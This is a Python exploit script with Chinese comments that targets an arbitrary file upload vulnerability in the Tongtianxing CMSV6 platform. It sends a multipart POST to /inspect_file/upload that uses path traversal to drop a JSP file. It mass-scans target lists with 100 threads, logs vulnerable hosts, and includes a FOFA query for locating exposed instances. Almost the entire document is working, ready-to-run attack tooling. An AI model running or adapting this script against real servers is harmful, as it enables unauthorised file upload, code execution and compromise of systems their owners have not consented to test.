import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='通天星-CMSV6-inspect_file-upload存在任意文件上传漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/inspect_file/upload"
    headers = {
        "User-Agent":"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.1)",
        "Accept-Encoding":"gzip,deflate",
        "Accept":"*/*",
        "Connection":"close",
        "Content-Length":"226",
        "Content-Type":"multipart/form-data;boundary=2e7688d712bcc913201f327059f9976b",
    }
    data = '--2e7688d712bcc913201f327059f9976b\nContent-Disposition: form-data; name="uploadFile"; filename="../707140.jsp"\nContent-Type: application/octet-stream\n\n<% out.println("007319607"); %>\n--2e7688d712bcc913201f327059f9976b--'
    try:
        response = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and "result" in response.text:
            print(f"[+]{target}任意存在文件上传漏洞")
            with open('通天星_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在任意文件上传漏洞\n")
        else:
            print(f"[-]{target}不存在任意文件上传漏洞")
    except:
        print(f"[x]{target}可能存在任意文件上传漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# body="./open/webApi.html"||body="/808gps/"